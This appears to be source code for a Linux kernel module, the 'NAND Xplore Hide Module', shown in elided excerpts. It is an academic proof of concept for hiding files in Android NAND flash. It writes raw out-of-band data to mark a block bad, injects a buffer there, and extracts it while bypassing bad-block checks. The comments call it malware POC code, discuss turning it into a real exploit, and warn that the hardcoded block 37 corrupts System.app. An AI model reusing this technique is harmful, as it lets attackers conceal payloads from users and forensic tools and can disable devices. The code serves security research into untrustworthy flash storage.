...
#define PRINT_PREF KERN_INFO "nandx_hide: "
 ...
 * Note from m0nk:
 * 
 * On my device, block 37 contains a large section of 
 * System.app, so if you run the code without looking for an
 * empty section of NAND, you will most def crash and reboot.
 * When the device comes back alive, System.app is partially
 * 0xDEADBEEF and resides in BAD NAND (so it doesn't load).  
 * Do NOT expect your devce to function properly after this
 * unless you change the value or run my
 * "Find empty space" method
 */
static int blockToKill = 37;

/*
 * The following 7000 lines or so are basically a direct
 * copy / paste from ../devices/msm_nand.c
 * I simply copied them en masse to get the permissions and 
 * access to jump into the OOB.  This could be cleaner, but 
 * the whole excercise is academic to prove NAND untrustworthy.
 * 
 * If you solely want to follow my code to see how this works, 
 * jump down until you see another note from me saying "Start HERE"
 * 
 * The only edits I made to msm_nand.c was to neuter the loading and probing
 * of the driver code. It is now just initialization for me to call into.
 * I also mocked up a fake struct msm_nand_data because I was too lazy to track the 
 * real one down through Makefile linking.
 * 
 */
...
static struct flash_platform_data nandx_msm_nand_data = {
  .parts	= NULL,
  .nr_parts	= 0,
...
static void *msm_nand_get_dma_buffer(struct msm_nand_chip *chip, size_t size)
{
  ...
  do {
    ...
    if (size + free_index * MSM_NAND_DMA_BUFFER_SLOTS >= MSM_NAND_DMA_BUFFER_SIZE)
      return NULL;
    
    if ((bitmask & current_need_mask) == 0) {
      old_bitmask = atomic_cmpxchg(&chip->dma_buffer_busy, bitmask,bitmask | current_need_mask);
...
{
  /* Flash ID   ID Mask Density(MB)  Wid         Pgsz   Blksz   oobsz      Bsy  Recov  2nd_bbm    Manuf */
  {0x00000000,  0xFFFFFFFF,          0,          0,     0,      0,         0,   2,     7,         0 }, /*ONFI*/
  {0x1500aaec, 0xFF00FFFF,           (256<<20),  0,     2048,   (2048<<6), 64,  2,     7,         1 }, /*Sams*/
  {0x5500baec, 0xFF00FFFF,           (256<<20),  1,     2048,   (2048<<6), 64,  2,     7,         1 }, /*Sams*/
  {0x6600bcec, 0xFF00FFFF,           (512<<20),  1,     4096,   (4096<<6), 128, 2,     7,         1 }, /*Sams*/
  {0x1500aa98, 0xFFFFFFFF,           (256<<20),  0,     2048,   (2048<<6), 64,  2,     7,         0 }, /*Tosh*/
  {0x5500ba98, 0xFFFFFFFF,           (256<<20),  1,     2048,   (2048<<6), 64,  2,     7,         0 }, /*Tosh*/
  {0xd580b12c, 0xFFFFFFFF,           (128<<20),  1,     2048,   (2048<<6), 64,  2,     7,         0 }, /*Micr*/
  {0x5580baad, 0xFFFFFFFF,           (256<<20),  1,     2048,   (2048<<6), 64,  2,     7,         0 }, /*Hynx*/
  {0x5510baad, 0xFFFFFFFF,           (256<<20),  1,     2048,   (2048<<6), 64,  2,     7,         0 }, /*Hynx*/
  {0x55d1b32c, 0xFFFFFFFF,           (1024<<20), 1,     2048,   (2048<<6), 64,  9,     6,         0 }, /*Micr*/
  {0x5591b398, 0xFFFFFFFF,           (1024<<20), 1,     2048,   (2048<<6), 64,  9,     6,         0 }, /*Tosh*/
  {0x6600b398, 0x7F00FFFF,           (1024<<20), 1,     4096,   (4096<<6), 128, 9,     6,         0 }, /*Tosh*/
  {0x6600b3ec, 0xFF00FFFF,           (1024<<20), 1,     4096,   (4096<<6), 128, 9,     6,         1 }, /*Sams*/
...
uint32_t flash_onfi_probe(struct msm_nand_chip *chip)
{
  ...
  if (nandx_msm_nand_data.nr_parts) {
    page_address = ((nandx_msm_nand_data.parts[0]).offset << 6);
  } else {
    pr_err("flash_onfi_probe: No partition info available\n");
    err = -EIO;
    return err;
  }
  
  pm_qos_update_requirement(PM_QOS_CPU_DMA_LATENCY, MODULE_NAME, PM_QOS_NO_ISAPC);
  wait_event(chip->wait_queue, (onfi_identifier_buf = msm_nand_get_dma_buffer(chip, ONFI_IDENTIFIER_LENGTH)));
  dma_addr_identifier = msm_virt_to_dma(chip, onfi_identifier_buf);
  
  wait_event(chip->wait_queue, (onfi_param_info_buf = msm_nand_get_dma_buffer(chip, ONFI_PARAM_INFO_LENGTH)));
  dma_addr_param_info = msm_virt_to_dma(chip, onfi_param_info_buf);
  
  wait_event(chip->wait_queue, (dma_buffer = msm_nand_get_dma_buffer(chip, sizeof(*dma_buffer))));
  
  dma_buffer->data.sflash_bcfg_orig = flash_rd_reg(chip, MSM_NAND_SFLASHC_BURST_CFG);
  dma_buffer->data.devcmd1_orig = flash_rd_reg(chip, MSM_NAND_DEV_CMD1);
  dma_buffer->data.devcmdvld_orig = flash_rd_reg(chip, MSM_NAND_DEV_CMD_VLD);
  
  while (cmd_set_count-- > 0) {
    cmd = dma_buffer->cmd;
    
    dma_buffer->data.devcmd1_mod = (dma_buffer->data.devcmd1_orig & 0xFFFFFF00) | (cmd_set_count ? FLASH_READ_ONFI_IDENTIFIER_COMMAND : FLASH_READ_ONFI_PARAMETERS_COMMAND);
    dma_buffer->data.cmd = MSM_NAND_CMD_PAGE_READ;
    dma_buffer->data.addr0 = (page_address << 16) | (cmd_set_count ? FLASH_READ_ONFI_IDENTIFIER_ADDRESS : FLASH_READ_ONFI_PARAMETERS_ADDRESS);
    dma_buffer->data.addr1 = (page_address >> 16) & 0xFF;
    dma_buffer->data.cfg0 =	(cmd_set_count ? MSM_NAND_CFG0_RAW_ONFI_IDENTIFIER : MSM_NAND_CFG0_RAW_ONFI_PARAM_INFO);
    dma_buffer->data.cfg1 =	(cmd_set_count ? MSM_NAND_CFG1_RAW_ONFI_IDENTIFIER : MSM_NAND_CFG1_RAW_ONFI_PARAM_INFO);
    dma_buffer->data.sflash_bcfg_mod = 0x00000000;
    dma_buffer->data.devcmdvld_mod = (dma_buffer->data.devcmdvld_orig & 0xFFFFFFFE);
    ...
    cmd->cmd = 0;
    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.devcmdvld_mod);
    ...
    cmd->cmd = 0;
    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.devcmd1_mod);
    ...
    cmd->dst = (cmd_set_count ? dma_addr_identifier : dma_addr_param_info);
    cmd->len = (cmd_set_count ? ONFI_IDENTIFIER_LENGTH : ONFI_PARAM_INFO_LENGTH);
    cmd++;
    
    /* Restore the DEV_CMD1 register */
    cmd->cmd = 0 ;
    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.devcmd1_orig);
    cmd->dst = MSM_NAND_DEV_CMD1;
    cmd->len = 4;
    cmd++;
    ...
    cmd->cmd = 0;
    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.devcmdvld_orig);
    cmd->dst = MSM_NAND_DEV_CMD_VLD;
    cmd->len = 4;
    cmd++;
    ...
    if (dma_buffer->data.flash_status & 0x110) {
      pr_info("MPU/OP error (0x%x) during ONFI probe\n", dma_buffer->data.flash_status);
      err = -EIO;
      break;
    }
    
    if (cmd_set_count) {
      onfi_param_page_ptr = (struct onfi_param_page *)(&(onfi_identifier_buf[0]));
      if (onfi_param_page_ptr->parameter_page_signature != ONFI_PARAMETER_PAGE_SIGNATURE) {
	pr_info("ONFI probe : Found a non ONFI Compliant device \n");
	err = -EIO;
	break;
      }
    } else {
      for (crc_chk_count = 0; crc_chk_count < ONFI_PARAM_INFO_LENGTH / ONFI_PARAM_PAGE_LENGTH;
      crc_chk_count++) {
	onfi_param_page_ptr = (struct onfi_param_page *)(&(onfi_param_info_buf[ONFI_PARAM_PAGE_LENGTH * crc_chk_count]));
	if (flash_onfi_crc_check((uint8_t *)onfi_param_page_ptr, ONFI_PARAM_PAGE_LENGTH - 2) == onfi_param_page_ptr->integrity_crc) {
	  break;
	}
      }
      if (crc_chk_count >= ONFI_PARAM_INFO_LENGTH / ONFI_PARAM_PAGE_LENGTH) {
	pr_info("ONFI probe : CRC Check failed on ONFI Parameter data \n");
	err = -EIO;
	break;
	
      } else {
	  supported_flash[0].flash_id = flash_read_id(chip);
	  supported_flash[0].widebus  = onfi_param_page_ptr->features_supported & 0x01;
	  supported_flash[0].pagesize = onfi_param_page_ptr->number_of_data_bytes_per_page;
	  supported_flash[0].blksize  = onfi_param_page_ptr->number_of_pages_per_block * supported_flash[0].pagesize;
	  supported_flash[0].oobsize  = onfi_param_page_ptr->number_of_spare_bytes_per_page;
	  supported_flash[0].density  = onfi_param_page_ptr->number_of_blocks_per_logical_unit * onfi_param_page_ptr->number_of_logical_units * supported_flash[0].blksize;
	   
	  for (index = 1; index < ARRAY_SIZE(supported_flash); index++) {
	    if ((supported_flash[0].flash_id & supported_flash[index].mask) == (supported_flash[index].flash_id & supported_flash[index].mask)){
	      supported_flash[0].wr_rd_bsygap = supported_flash[index].wr_rd_bsygap;
	      supported_flash[0].recovery_cycles = supported_flash[index].recovery_cycles;
	      supported_flash[0].second_bbmarker = supported_flash[index].second_bbmarker;
	      break;
  ...
  msm_nand_release_dma_buffer(chip, dma_buffer, sizeof(*dma_buffer));
  msm_nand_release_dma_buffer(chip, onfi_param_info_buf,ONFI_PARAM_INFO_LENGTH);
  msm_nand_release_dma_buffer(chip, onfi_identifier_buf, ONFI_IDENTIFIER_LENGTH);
			     ...
			     struct mtd_oob_ops *ops)
{
  ...
  if (ops->mode != MTD_OOB_RAW) {
    ...
    if (ops->datbuf != NULL && (ops->len % (mtd->writesize + mtd->oobsize)) != 0) {
      pr_err("%s: unsupported ops->len, %d for MTD_OOB_RAW\n", __func__, ops->len);
      return -EINVAL;
    }
  }
  ...
  if (ops->oobbuf && !ops->datbuf) {
    page_count = ops->ooblen / ((ops->mode == MTD_OOB_AUTO) ? mtd->oobavail : mtd->oobsize);
	...
	dma_buffer->data.cmd = MSM_NAND_CMD_PAGE_READ;
	dma_buffer->data.cfg0 = (MSM_NAND_CFG0_RAW & ~(7U << 6)) | ((cwperpage-1) << 6);
	...
	if (ops->datbuf) {
	  if (ops->mode != MTD_OOB_RAW)
	    sectordatasize = (n < (cwperpage - 1)) ? 516 : (512 - ((cwperpage - 1) << 2));
	  else
	    sectordatasize = 528;
	...
	if (ops->oobbuf && (n == (cwperpage - 1) || ops->mode != MTD_OOB_AUTO)) {
	  cmd->cmd = 0;
	if (n == (cwperpage - 1)) {
	  cmd->src = MSM_NAND_FLASH_BUFFER + (512 - ((cwperpage - 1) << 2));
	...
	if (ops->datbuf && ops->mode != MTD_OOB_RAW) {
	  ...
	  dma_sync_single_for_cpu(chip->dev, data_dma_addr_curr-mtd->writesize, mtd->writesize, DMA_BIDIRECTIONAL);
	  ...
	  dma_sync_single_for_device(chip->dev, data_dma_addr_curr-mtd->writesize, mtd->writesize, DMA_BIDIRECTIONAL);
	  
	}
	if (ops->oobbuf) {
	  dma_sync_single_for_cpu(chip->dev, oob_dma_addr_curr - (ops->ooblen - oob_len), ops->ooblen - oob_len, DMA_BIDIRECTIONAL);
	  ...
	  dma_sync_single_for_device(chip->dev, oob_dma_addr_curr - (ops->ooblen - oob_len), ops->ooblen - oob_len, DMA_BIDIRECTIONAL);
	}
      }
      if (pageerr) {
	for (n = start_sector; n < cwperpage; n++) {
				       ...
				       struct mtd_oob_ops *ops)
{
  ...
  if (ops->oobbuf && !ops->datbuf) {
	...
	if (n == start_sector) {
	  if (!interleave_enable) {
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.nc10_flash_dev_cmd_vld);
	    cmd->dst = NC10(MSM_NAND_DEV_CMD_VLD);
	    cmd->len = 4;
	    cmd++;
	    
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.nc10_flash_dev_cmd1);
	    ...
	    /* NC01, NC10 --> ADDR1 */
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.nandc11_addr1);
	    ...
	    /* enable CS0 & CS1 */
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip,&dma_buffer->data.ebi2_chip_select_cfg0);
	    ...
	    /* Enable CS0 for NC01 */
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.chipsel_cs0);
	    cmd->dst =
	  ...
	  if (n == cwperpage - 1) {
	    ...
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip,&dma_buffer->data.adm_mux_cmd_ack_req_nc01);
	    ...
	    /* NC10 --> ADDR0 ( 0x0 ) */
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip,&dma_buffer->data.nandc10_addr0);
	    ...
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip,&dma_buffer->data.adm_mux_data_ack_req_nc01);
	    cmd->dst = EBI2_NAND_ADM_MUX;
	    cmd->len = 4;
	    cmd++;
	    ...
	    /* NC01 --> ADDR0 */
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.nandc01_addr0);
	    ...
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.adm_mux_cmd_ack_req_nc10);
	    cmd->dst = EBI2_NAND_ADM_MUX;
	    cmd->len = 4;
	    cmd++;
	...
	if (ops->datbuf || (ops->oobbuf &&
	  ...
	  if (n % 2 == 0) {
	    ...
	    cmd->cmd = 0;
	    cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.adm_mux_data_ack_req_nc10);
	    cmd->dst = EBI2_NAND_ADM_MUX;
	    cmd->len = 4;
	    cmd++;
	    ...
	    if (n != cwperpage - 1) {
	      ...
	      cmd->cmd = 0;
	      cmd->src =
	      msm_virt_to_dma(chip, &dma_buffer->data.adm_mux_cmd_ack_req_nc10);
	      cmd->dst = EBI2_NAND_ADM_MUX;
	      cmd->len = 4;
	      cmd++;
	  ...
	  if (n == (cwperpage - 1)) {
	     ...
	     * last codeword!!!
	     */
	    cmd->src = NC10(MSM_NAND_FLASH_BUFFER) + (512 - ((cwperpage - 1) << 2));
	    sectoroobsize = (cwperpage << 2);
	    if (ops->mode != MTD_OOB_AUTO)
	      sectoroobsize += 10;
	  } else {
	    if (n % 2 == 0) {
	      cmd->src = NC01(MSM_NAND_FLASH_BUFFER) + 516;
	      sectoroobsize = 10;
	    } else {
	      cmd->src = NC10(MSM_NAND_FLASH_BUFFER) + 516;
	      sectoroobsize = 10;
	    }
	  }
	  cmd->dst = oob_dma_addr_curr;
      ...
      cmd->cmd = 0;
      cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.adm_default_mux);
      cmd->dst = EBI2_NAND_ADM_MUX;
      cmd->len = 4;
      cmd++;
      ...
      if (!interleave_enable) {
	cmd->cmd = 0;
	cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.nc10_flash_dev_cmd_vld_default);
	cmd->dst = NC10(MSM_NAND_DEV_CMD_VLD);
	cmd->len = 4;
	cmd++;
	
	cmd->cmd = 0;
	cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.nc10_flash_dev_cmd1_default);
	cmd->dst = NC10(MSM_NAND_DEV_CMD1);
	cmd->len = 4;
	cmd++;
      } else {
	/* disable CS1 */
	cmd->cmd = 0;
	cmd->src = msm_virt_to_dma(chip, &dma_buffer->data.default_ebi2_chip_select_cfg0);
	cmd->dst = EBI2_CHIP_SELECT_CFG0;
	cmd->len = 4;
	cmd++;
      }
	...
	if (ops->oobbuf) {
      ...
      if (pageerr) {
	for (n = start_sector; n < cwperpage; n++) {
	  if (dma_buffer->data.result[n].buffer_status & MSM_NAND_BUF_STAT_UNCRCTBL_ERR) {
	    /* not thread safe */
	    mtd->ecc_stats.failed++;
	  pageerr = -EBADMSG;
	  break;
      ...
      if (!rawerr) { /* check for corretable errors */
	for (n = start_sector; n < cwperpage; n++) {
	  ecc_errors = dma_buffer->data.result[n].buffer_status & MSM_NAND_BUF_STAT_NUM_ERR_MASK;
	  if (ecc_errors) {
	    total_ecc_errors += ecc_errors;
	    /* not thread safe */
	    mtd->ecc_stats.corrected += ecc_errors;
    ...
    err_dma_map_oobbuf_failed:
    if (ops->datbuf) {
      dma_unmap_page(chip->dev, data_dma_addr,ops->len, DMA_BIDIRECTIONAL);
    }
    ...
    ops->oobretlen = ops->ooblen - oob_len;
    if (err)
      pr_err("msm_nand_read_oob_dualnandc %llx %x %x failed %d, corrected %d\n",from, ops->datbuf ? ops->len : 0, ops->ooblen, err, total_ecc_errors);
    return err;
}
...
err = -EIO;
  ...
  static int __devinit nandx_msm_nand_probe(struct platform_device *pdev)
  {
    struct msm_nand_info *info;
    struct resource *res;
    int err;
  ...
  static int __devexit nandx_msm_nand_remove(struct platform_device *pdev)
  {
  ...
  #define DRIVER_NAME "nandx_msm_nand"
  
  static struct platform_driver nandx_msm_nand_driver = {
    .probe		= nandx_msm_nand_probe,
    .remove		= __devexit_p(nandx_msm_nand_remove),
    .driver = {
      .name		= DRIVER_NAME,
    }
  };
  ...
  static int nandx_msm_nand_init(void)
  {
    pm_qos_add_requirement(PM_QOS_CPU_DMA_LATENCY, MODULE_NAME,
			   PM_QOS_DEFAULT_VALUE);
    return platform_driver_register(&nandx_msm_nand_driver);
  }
  
  static void nandx_msm_nand_exit(void)
  {
    pm_qos_remove_requirement(PM_QOS_CPU_DMA_LATENCY, MODULE_NAME);
    platform_driver_unregister(&nandx_msm_nand_driver);
  }
  
  
  /*
   * As promised above, you should "Start HERE" is you
   * simply want to peruse my code and follow the flaws.
   * 
   * I will narrate in comments as much as possible.
   * 
   */
  
  // === Setup and print for debug infoz === //
  
  /* *******************
   * NANDX Call: nandx_print_mtd_info
   *   Simply print the full data of the NAND chip
   * 
   * m0nk wrote me!
   * ******************* */ 
  static void nandx_print_mtd_info(void)
  {
    printk(KERN_INFO "\n");
    printk(KERN_INFO "=================================================\n");
    printk(PRINT_PREF "Full MTD device info: %d\n", dev);
    
    /* 
     * Below is a complete dump of mtd_info from mtd.h 
     * ( .../kernel/include/linux/mtd/mtd.h )
     * with prints and comments as applicable
     * Some things I did not print but left here so someone else could
     * if there are so inclined
     *
     * Just a massive debug thing for those interested.
     */
    
    //NOT PRINTED - u_char type;
    
    printk(PRINT_PREF "MTD Flags: %d\n", mtd->flags);
    // Total size of the MTD
    //printk(PRINT_PREF "MTD Total Size: %d\n", mtd->size);
    /* "Major" erase size for the device. Naïve users may take this
     * to be the only erase size available, or may use the more detailed
     * information below if they desire
     */
    printk(PRINT_PREF "MTD Major Erase Size: %d\n", mtd->erasesize);
     ...
     * 1 or larger.
     */
    printk(PRINT_PREF "MTD Minimal Write Size: %d\n", mtd->writesize);
    // Amount of OOB data per block (e.g. 16)
    printk(PRINT_PREF "MTD OOB Size per block: %d\n", mtd->oobsize);
    // Available OOB bytes per block
    printk(PRINT_PREF "MTD Available OOB per block size: %d\n", mtd->oobavail);
    /*
     * If erasesize is a power of 2 then the shift is stored in
     * erasesize_shift otherwise erasesize_shift is zero. Ditto writesize.
     */
    printk(PRINT_PREF "MTD Erase Size Shift: %d\n", mtd->erasesize_shift);
    printk(PRINT_PREF "MTD Write Size Shift: %d\n", mtd->writesize_shift);
    /* Masks based on erasesize_shift and writesize_shift */
    printk(PRINT_PREF "MTD Erase Size Mask: %d\n", mtd->erasesize_mask);
    printk(PRINT_PREF "MTD Write Size Mask: %d\n", mtd->writesize_mask);
    
    // Kernel-only stuff starts here.
    
    //NOT PRINTED - const char *name;
    printk(PRINT_PREF "MTD Index: %d\n", mtd->index);
    
    /* ecc layout structure pointer - read only ! */
    //NOT PRINTED - struct nand_ecclayout *ecclayout;
    
    /* Data for variable erase regions. If numeraseregions is zero,
     * it means that the whole device has erasesize as given above.
     */
    printk(PRINT_PREF "MTD Erase Regions: %d\n", mtd->numeraseregions);
    //NOT PRINTED - struct mtd_erase_region_info *eraseregions;
    
    /*********** 
     * These would be nice to iterate over and print at some point....
     ************/
    ...
    printk(PRINT_PREF "MTD 2nd BB marker: %d\n", mtd->second_bbmarker);
  ...
  /* *******************
   * NANDX Call: nandx_move_data_from_block
   *   Move all real data from a NAND block prior to BBT manipulation
   *
   * WARNING: This does nothing right now, simply a placeholder for good practice
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to clear of good data
   * @retrun: (int) Success or Failure
   *
   * m0nk wrote me!
   * ******************* */ 
  static int nandx_move_data_from_block(int blockLocation)
  {
    /*
     * Q: Given linking and whatnot at the file system layer, can this even be done 
     * correctly at this level? Do we need to move up into YAFFS?
     * 
     * A: We would need to move this to YAFFS if we were writing a real exploit.
     * Then gain, IF we were writing a real exploit we could simply kernel jump
     * into the private functions and do this WAY cleaner. POC is ugly but pseudo-
     * functional
     * 
     */
    
    //I do nothing but print this.  DO NOT trust my logging :D
    printk(PRINT_PREF "Should be moving all the data stored in block before wipe: %d\n", blockLocation);
    
    return 0;	
  }
  
  /* *******************
   * NANDX Call: nandx_mark_bad_framework
   *   Marks a block of NAND as Bad in the BBT/OOB
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to mark bad
   * @retrun: (int) Success or Failure
   *
   * m0nk wrote me!
   * ******************* */
  static int nandx_mark_bad_framework(int blockLocation)
  {
     ...
     * it felt the cleanest at the time. YMMV. This will typically fail and hence the other method.
     * The problem is that the kernel typicallyo has permission to write to the NAND, but not the OOB.
     * When it tries, it fails and we catch it.
     * 
  ...
  /* *******************
   * NANDX Call: nandx_mark_bad_manual
  ...
  static int nandx_mark_bad_manual(int blockLocation)
  {
     ...
     * give an overview:
     * 
     * We grab the RAW device, and becuse we are a nand driver, we
     ...
     * (the block is "bad" after reboot, so I doint have to manually remap it)
  ...
  /* *******************
   * NANDX Call: nandx_erase_block
   *   Erases the targeted NAND block, probably not needed.  
   * 	 Simple wrapper for framework calls
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to erase
   * @retrun: (int) Success or Failure
   *
   * m0nk wrote me!
   * ******************* */ 
  static int nandx_erase_block(int blockLocation)
  {
     ...
     *   static inline int erase_eraseblock(int ebnum) from:
    ...
    printk(PRINT_PREF "Block %d has been erased\n", blockLocation);
    
    return 0;
  } 
  
  /* *******************
   * NANDX Call: nandx_mark_block_good
   *   Marks a block of NAND as Good in the BBT
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to mark good
   * @retrun: (int) Success or Failure
   *
   * m0nk wrote me!
   * ******************* */ 
  static int nandx_mark_block_good(int blockLocation)
  {
    /*
     * This will be significantly harder than marking it bad.
     * I expect we will have to erase the entire block to reset the OOB 
     * to our requested values.  
     * 
     * Also, the OOB fields are quite specific and unique to device classes
     * so a general reverse of the msm_nand_block_markbad doesn't work
     * (we can't just fill the OOB with 1's - that would be "un-good")
     * 
     * For now, this is unimplemented.  Since we can write our own reader
     * quite easily, we can bypass the checks for the BBT when reading
     * and just grab things into RAW buffers.
     *
     * Leaving this in as a placeholder for completeness. 
     */
    
    int ret; 
    
    // We really just need to 0xFF part of the OOB.
    ret = nandx_erase_block( blockLocation );  
    
    return ret;
  }
  
  /* *******************
   * NANDX Call: nandx_buffer_write_to_block
   *   Writes a buffer directly onto a specific NAND block
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to write to
   * @arg: (void *)bufferToWrite: the buffer to write to NAND
   * @retrun: (int) Success or Failure
   *
   * m0nk wrote me!
   * ******************* */ 
  static int nandx_buffer_write_to_block(int blockLocation, void *bufferToWrite)
  {
    ...
    if (ret) {
      ...
      // fine fo some simple malware POC code.
  ...
  /* *******************
   * NANDX Call: nandx_buffer_pull_from_block
   *   Loads a buffer directly from a block of NAND
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to pull from
   * @arg: (void *)bufferToFill: the buffer to fill from NAND
   * @arg: (void *)oobBufferToFill: the buffer to fill from the NAND oob region
   * @retrun: (int) Success or Failure
   *
   * m0nk wrote me!
   * ******************* */ 
  static int nandx_buffer_pull_from_block(int blockLocation, void *bufferToFill)
  {
    /* We should be able to shift the NAND into RAW mode and just pull the data.
     * Typical read, just need to go low to bypass the bbt/oob checks
     * We very well could kernel panic here...
     *
     * Notable places in the code one could push this functionality:
     *	* Almost anywhere in the MTD system.  I like the tests because I can
     *	* easily bypass the BBT check
     *
     * 
     * I chose to copy / paste / edit: 
     *    static int read_eraseblock_by_page(int ebnum)
     *    FROM: .../mtd/tests/mtd_readtest.c by Adrian Hunter
     */
    ...
    // I removed the check for the BBT here, so we can just "pretend" this is kosher
    
    for (i = 0; i < pgcnt; i++) {
      memset(bufferToFill, 0 , pgcnt);
      ret = mtd->read(mtd, addr, pgsize, &read, bufferToFill);
      if (ret == -EUCLEAN)
	ret = 0;
      if (ret || read != pgsize) {
  ...
  /* *******************
   * Borrowed Call: original_nand_read_tester
   *   This is renamed from static int __init mtd_readtest_init(void)
   * 	 Simply running this partial test to load up all the info we need.
   * 
   * Basically, I am using this to set up all my varialbes for reading and writing
   * so I don't have to call into the above driver code.  This is mainly for reference
   * and code understading.
   * 
   * FROM: .../mtd/tests/mtd_readtest.c by Adrian Hunter
   * ******************* */ 
  static int nandx_setup(void)
  {
    uint64_t tmp;
    int err;
    int i;
    ...
    //Simply setting up our buffers for later use
    err = -ENOMEM;
  ...
  /* *******************
   * NANDX Call: nandx_file_injector
   *   Helper function that injects a file onto specific NAND block and marks it bad!
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to write to
   * @arg: (void *)bufferToWrite: the buffer to write to NAND
   *
  ...
  static void nandx_file_injector(int blockLocation, void *bufferToWrite)
  {
    /* 
     * 
     * In reality, we would want to move all linked and good data out of the block first.
    ...
    //TODO: Grab and check return values here!!!!
    
    /*
     * TODO: For the final version of this (and for stability):
     * 
     * Write a scanner that looks for empty blocks and use that one instead of the 
     * hardcoded value of block 37. That is fine for the POC, but not really functional
     * 
     */
  ...
  /* *******************
   * NANDX Call: nandx_file_extractor
   *   Helper function that extracts a buffer from specific NAND block that is marked bad!
   * 
   * @arg: (int)blockLocation: the numerical marker for the block to pull from
   * @arg: (void *)bufferToFill: the buffer to fill from NAND
   * @arg: (void *)oobBufferToFill: the buffer to fill from the NAND oob region
   ...
   * m0nk wrote me!
   * ******************* */ 
  static void nandx_file_extractor(int blockLocation, void *bufferToFill)
  {
    /* In reality, we would want to pull the data on the bad block, then clean the block
     * and mark it as usable again.  This SHOULD erase the entire block to remove 
     * traces of our injected data.
     *
     * This extractor:
     *   1 - Pull the RAW data from Bad Block into our buffer
     * 	 2 - Erases the targeted block / Marks the target block as good
     *   3 - Syncs the system if needed (do we need this?)
     * 
     */
     
    //Pull the RAW data out first! 
    nandx_buffer_pull_from_block( blockLocation, bufferToFill );
    
    //Mark it as good and move on!
    nandx_mark_block_good( blockLocation );
     
  }
  
  EXPORT_SYMBOL_GPL(nandx_file_injector);
  EXPORT_SYMBOL_GPL(nandx_file_extractor);
  ...
  static void __exit nandx_hide_exit(void)
  {
    nandx_msm_nand_exit();
    return;
  }
  module_exit(nandx_hide_exit);
  
  MODULE_DESCRIPTION("NAND Xplore Hide Module");
